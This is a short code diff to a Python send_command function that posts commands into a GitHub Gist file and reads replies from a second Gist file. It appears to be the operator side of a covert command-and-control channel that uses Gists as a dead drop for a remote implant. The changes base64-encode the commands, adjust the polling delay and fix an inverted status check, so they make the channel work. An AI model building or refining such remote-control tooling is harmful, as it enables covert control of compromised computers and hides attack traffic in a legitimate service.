@@ -28,7 +28,7 @@ def send_command(command):
                 'Authorization': f'Bearer {GITHUB_API_KEY}',
                 "X-GitHub-Api-Version" : "2022-11-28"}
     send_payload = {
-        'files' : {"send.txt" : {"content" : command }}
+        'files' : {"send.txt" : {"content" : base64.b64encode(command.encode("utf-8")) }}
     }
     response = requests.patch(f'https://api.github.com/gists/{GIST_ID}', headers=headers, data=json.dumps(send_payload))
     
@@ -36,10 +36,10 @@ def send_command(command):
         print("Failure, ", response.status_code)
         print(response.text)
     else:
-        # we sent the request, wait 2 seconds to request the reply
-        time.sleep(2)
+        # we sent the request, wait 3 seconds to request the reply
+        time.sleep(3)
         response = requests.get(f'https://api.github.com/gists/{GIST_ID}', headers=headers)
-        if response.status_code != 200:
+        if response.status_code == 200:
             content_json = json.loads(response.text)
             content_text = content_json['files']
             if 'receive.txt' in content_text:
@@ -47,6 +47,8 @@ def send_command(command):
                 if decrypted != "@":
                     print(decrypted)
                     clear_receive_file()
+        else:
+            print(response.status_code)
 
 
     
